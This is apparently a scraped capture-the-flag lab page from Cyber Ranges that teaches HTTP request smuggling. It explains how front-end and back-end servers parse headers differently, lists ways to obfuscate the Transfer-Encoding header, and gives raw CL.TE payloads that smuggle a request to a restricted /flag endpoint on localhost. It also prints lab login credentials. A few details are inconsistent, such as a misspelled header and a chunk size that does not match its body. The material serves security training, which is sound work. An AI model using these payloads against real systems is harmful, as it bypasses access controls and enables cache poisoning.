@@ -1,0 +1,420 @@
+Timestamp: 2025-12-27T13:35:02.482553
+URL: https://app.cyberranges.com/instance/start/694fc462dabdba0ee85a748a
+Title: Loading Scenario - CYBER RANGES
+Hash: f6545a54e2c5b113cffb04b4338baab5d6d8d992b9755583ff9deeeaa531d24b
+================================================================================
+MISSION
+RULES
+LEADERBOARD
+VPN
+HTTP REQUEST SMUGGLING
+INTRODUCTION
+
+Modern web architectures relying on load balancers and reverse proxies create complex request chains that often hide desynchronization vulnerabilities. HTTP request smuggling exploits these inconsistencies, allowing attackers to bypass front-end security controls and poison web caches. This scenario transitions from theory to practical application, using Burp Suite and Kali Linux to detect and exploit CL.TE vulnerabilities. You will analyze header parsing discrepancies and manipulate traffic to bypass filters and reach restricted internal endpoints.
+
+LAB ACCESS GUIDELINES
+
+To support the completion of this scenario, you are provided with a Kali VM.
+
+Browser-based access is provided via the web service for GUI.
+
+VM
+
+	
+
+IP/URL
+
+	
+
+Username
+
+	
+
+Password
+
+
+
+
+Kali
+
+	
+
+192.168.125.99
+
+	
+
+rangeadmin
+
+	
+
+password_CR1
+
+
+
+
+Web-App
+
+	
+
+http://192.168.125.100:8002/index.html
+
+	
+
+N/A
+
+	
+
+N/A
+
+For VPN access steps see the Rules section.
+
+OBJECTIVE
+
+You'll use a Kali VM to access the vulnerable web application and see how it responds to different inputs. By the end, you will have exploited the HTTP Request Smuggling flaw to bypass filters and reach internal access. This gives you a practical look at how these attacks work in a controlled setting.
+
+WHAT IS HTTP REQUEST SMUGGLING
+
+Modern web architectures utilize complex chains of reverse proxies and load balancers. Understanding how these intermediate components process headers differently from back-end servers is critical for identifying desynchronization vulnerabilities.
+
+The discrepancy can be manipulated by attackers to trick/confuse the servers into processing requests differently, leading to various security implications.
+
+To understand the topic in detail, let's dive into an introduction to how web pages load, and the different components in web applications.
+
+	
+
+Key Point: Request Desynchronization
+
+HTTP request smuggling occurs when there is a discrepancy in how front-end and back-end servers interpret HTTP requests, specifically regarding where a request ends and the next one begins.
+
+A user types the HTTP address in a web browser.
+
+The web browser sends a HTTP request to a web server asking for the requested web page.
+
+The web server replies with a HTTP response containing the requested page.
+
+Finally, the web browser displays the received content to the user.
+
+ANATOMY OF WEB BROWSERS
+
+In modern web architecture, browsers navigate through a sophisticated network of servers and services, including reverse proxies, load balancers, caching servers, and web application firewalls, each interpreting HTTP headers as they relay requests.
+
+Load Balancers and Reverse Proxies
+
+Component
+
+	
+
+Primary Function
+
+	
+
+Examples
+
+
+
+
+Load Balancers
+
+	
+
+Distribute traffic across multiple servers for high availability and reliability; prevents server overload.
+
+	
+
+AWS Elastic Load Balancing, HAProxy, F5 BIG-IP
+
+
+
+
+Reverse Proxies
+
+	
+
+Sit before web servers to forward requests; act as a single access point and control for back-end servers.
+
+	
+
+NGINX, Apache with mod_proxy, Varnish
+
+A user types in a web browser the HTTP address to a web page.
+
+The web browser sends an HTTP request to the front-end web server asking for the requested web page.
+
+After processing the request, the front-end web server forwards it to the back-end server
+
+The web server replies with a HTTP response containing the requested page.
+
+Finally, the web browser displays the received content to the user.
+
+Structure of a Request
+
+Request Line:
+
+The first line of the request POST /hello HTTP/1.1 is the request line.
+
+It consists of at least three items: Method (POST), Path (/hello), and HTTP Version.
+
+	
+
+Easy to Confuse: Protocol Versions
+
+HTTP/2 and HTTP/1.1 have fundamentally different structures. Request smuggling primarily targets the ambiguity in HTTP/1.1's parsing of text-based headers, whereas HTTP/2 is binary-based.
+
+Request Headers:
+
+This section contains metadata about the request, such as the type of content being sent, the desired response format, and authentication tokens.
+
+Message Body:
+
+It carries entities related to the response. The body might be empty for a GET request, but for a POST request, it could contain form data, JSON payloads, or file uploads.
+
+HTTP PROTOCOL EVOLUTION
+
+To optimize performance, HTTP/1.1 utilizes persistent connections to reuse TCP sockets for multiple requests. This efficiency mechanism introduces the risk of request concatenation, which is the foundation of request smuggling attacks.
+
+When a client requests multiple resources (Javascript, Images, Pages, Ajax requests), requests can follow each other in the same TCP socket. The outgoing stream would look like the request below.
+
+GET /index.html HTTP/1.1
+Host: 192.168.125.100:8002
+Content-Length: 0
+
+
+POST /hello HTTP/1.1
+Host: 192.168.125.100:8002
+Content-Length: 35
+
+username=admin&password=admin123
+
+GET /logo.gif HTTP/1.1
+Host: 192.168.125.100:8002
+Content-Length: 0
+
+The challenge arises when the server needs to know where the request ends. The HTTP protocol provides 2 headers to represent or determine the end of the HTTP request:
+
+Content-Length
+
+Transfer-Encoding
+
+1. Content-Length (C.L)
+
+The Content-length is an entity header, representing the length of the request/message body sent to the receiver in bytes. HTTP request smuggling attack is based on inconsistent parsing and processing between the front-end server and back-end server for this length.
+
+2. Transfer-Encoding (T.E)
+
+Transfer-Encoding indicates what type of conversion is applied to the message body. There are five main attributes: chunked, compress, deflate, gzip, and identify.
+
+When the request contains the Transfer-encoding header with a chunked value, it means that the body of the request contains one or more chunks of data. Each chunk starts with a hexadecimal value that specifies its length and ends with a newline (\r\n). The web server understands that it has reached the end of the message body once it encounters a chunk containing the value of zero.
+
+GET /hello HTTP/1.1
+Host: 192.168.125.100:8002
+...
+Tranfer-Encoding: chunked
+
+0
+
+smuggled
+
+The above HTTP request ends when the web server reaches a chunk of zero.
+
+	
+
+Reflection Point: Why does the presence of both Content-Length and Transfer-Encoding headers in a single request create a security risk?
+
+Model Answer: It creates ambiguity. If the frontend uses one header to determine length and the backend uses the other, they will disagree on where the request ends, allowing "smuggled" data to be interpreted as the start of a new request.
+
+HTTP Header Confusion
+
+Since the HTTP specification allows for both length headers, parsing discrepancies are inevitable in heterogeneous environments. We will now categorize these discrepancies into specific attack vectors based on header precedence.
+
+This parsing mismatch allows the front-end server to forward a request that contains another hidden request to the back-end server.
+
+TYPES OF HTTP REQUEST SMUGGLING ATTACKS
+
+(CL, TE): The front-end uses Content-Length, while the back-end uses Transfer-Encoding.
+
+(TE, CL): The front-end uses Transfer-Encoding, while the back-end uses Content-Length.
+
+(TE, TE): Both support Transfer-Encoding, but one can be induced to obfuscate or ignore it.
+
+Duplicate Content-length (CL.CL)
+
+Two Content-Length headers with conflicting values cause issues when the proxy and the backend do not use the same value.
+
+GET /hello HTTP/1.1
+Host: 192.168.125.100:8002
+...
+Content-Length: 9
+Content-Length: 3
+Request Smuggling (CL.TE)
+
+In CL.TE technique, the attacker exploits discrepancies where the frontend prioritizes Content-Length and the backend prioritizes Transfer-Encoding. The backend stops processing when it sees the chunk size 0, leaving the rest of the data (the smuggled request) to be treated as the start of the next request.
+
+NOTE: HTTP/1.1 allows you to send both Content-Length and Transfer-Encoding headers in the same request, but when both are sent, Transfer-Encoding takes precedence.
+
+There are potentially different ways to obfuscate the request on the Transfer-Encoding header to bypass restrictions.
+
+Transfer-Encoding header. For example:
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked [space]
+Transfer-Encoding: chunked X: X[\n]
+Transfer-Encoding: chunked Transfer-Encoding : chunked
+
+	
+
+Watch out for this: Ambiguous Headers
+
+If the Front End sees CL and Back End sees TE (or vice versa), the pipeline becomes desynchronized. Always check for duplicate headers or malformed Transfer-Encoding headers during analysis.
+
+HTTP REQUEST SMUGGLING: BASIC CL.TE VULNERABILITY
+
+A 403 Forbidden response on an external interface often protects internal administrative endpoints. By exploiting CL.TE inconsistencies, we can bypass these front-end controls to access restricted backend resources.
+
+Launch Burp Suite from the provided Kali VM. Once Burp Suite is started, we recommend using the built-in browser to proxy the requests.
+
+
+
+
+NOTE: By default, the Content-Length header is automatically updated. To exploit request smuggling, especially CL-TE where you are required to control the content length with any numeric value, ensure to unmark the 'Update Content-Length' option in the settings icon on the repeater tab.
+
+Accessing the Application
+
+Access the e-commerce application at http://192.168.125.100:8002/index.html.
+
+On enumeration, you identified a directory listing including a flag file which returns a 403 restriction access.
+
+
+
+
+Identification
+
+Send the request to the Burp Suite repeater.
+
+
+
+
+If you edit the endpoint from flag to an arbitrary name with the word flag it will return a 403 error.
+
+Exploitation
+
+With the backend server architecture identified and the cache mechanism mapped, we will now construct a CL.TE payload to desynchronize the socket and smuggle a request to the restricted endpoint.
+
+We will use the following logic to bypass the restriction:
+
+Stage
+
+	
+
+Action/Logic
+
+
+
+
+Objective
+
+	
+
+Reach the backend administrative interface binding to access the /flag.
+
+
+
+
+Mechanism
+
+	
+
+The backend accepts Host: 127.0.0.1 because it listens on all interfaces (0.0.0.0), effectively bypassing the frontend's external IP restrictions.
+
+
+
+
+Obfuscation
+
+	
+
+The Transfer-Encoding: asdchunked header is used. The Frontend ignores it (treating it as normal TE), but the Backend prioritizes it, triggering the smuggling.
+
+Copy-paste the following command to test the socket desynchronization:
+
+GET /hello HTTP/1.1
+Host: 192.168.125.100:8002
+Content-Length: 4
+Transfer-Encoding: asdchunked
+
+
+0
+
+Smuggled
+
+Next, we replace the body with the malicious request targeting the internal IP:
+
+GET /hello HTTP/1.1
+Host: 192.168.125.100:8002
+Content-Length: 4
+Transfer-Encoding: asdchunked
+
+
+2a
+GET /flag HTTP/1.1
+Host: 127.0.0.1:8002
+
+0
+
+The backend server processes the first request and interprets the request's end at '2a' (the chunk size). It then processes the next part (GET /flag...) as a new HTTP request. However, since the proxy only expects one response, you must send a follow-up "dummy" request to retrieve the smuggled response.
+
+GET /hello HTTP/1.1
+Host: 192.168.125.100:8002
+Content-Length: 4
+Transfer-Encoding: asdchunked
+
+2a
+GET /flag HTTP/1.1
+Host: 127.0.0.1:8002
+
+
+0
+
+GET /hello HTTP/1.1
+Host: 127.0.0.1:8002
+
+	
+
+Reflection Point: In the CL.TE exploitation steps, why is it necessary to send a "dummy" follow-up request after the smuggled payload?
+
+Model Answer: The frontend server believes it sent one request, but the backend sees two. The backend's response to the smuggled request is left "hanging" in the socket. The dummy request allows the attacker to retrieve this "orphaned" response.
+
+Retrieving the 3rd response reveals the repercussions of HTTP request manipulation, notably in triggering cache poisoning or cache deception issues.
+
+GET /hello HTTP/1.1
+Host: 192.168.125.100:8002
+Content-Length: 4
+Transfer-Encoding: asdchunked
+
+2a
+GET /flag HTTP/1.1
+Host: 127.0.0.1:8002
+
+
+0
+
+GET /hello HTTP/1.1
+Host: 127.0.0.1:8002
+
+
+GET /hello HTTP/1.1
+Host: 127.0.0.1:8002
+SUMMARY
+
+By exploiting the HTTP smuggling vulnerability, we managed to bypass the filters on the proxy and reach an internal endpoint/page that shouldn't be reachable from outside the network. This technique can also lead to cache poisoning and the chaining of vulnerabilities to amplify potential damage.
+
+CONCLUSION
+
+In this scenario, we have explored the fundamentals of HTTP request smuggling, identified vulnerable applications, and demonstrated exploitation techniques. By understanding the mechanics of this vulnerability and following the exploitation procedure, you can effectively identify and protect web applications against HTTP request smuggling attacks. In the next part, we will explore other attack vectors and techniques that can be used to smuggle requests.
+
+HTTP Request Smuggling
+By David Thumbi
+Loading...
+Loading 1%
+5m 58s left
